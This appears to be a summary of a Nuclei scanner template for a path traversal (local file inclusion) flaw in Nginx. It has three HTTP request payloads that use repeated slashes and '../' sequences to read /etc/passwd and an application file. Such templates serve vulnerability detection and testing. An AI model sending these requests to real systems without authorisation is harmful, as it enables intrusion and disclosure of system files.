# Nuclei Template: Nginx Server - Local File Inclusion
**Template ID:** nginx-merge-slashes-path-traversal
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`nginx-merge-slashes-path-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Nginx server is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}///////../../../etc/passwd
GET {{BaseURL}}/static///////../../../../etc/passwd
GET {{BaseURL}}///../app.js
```

## References
- https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
- https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
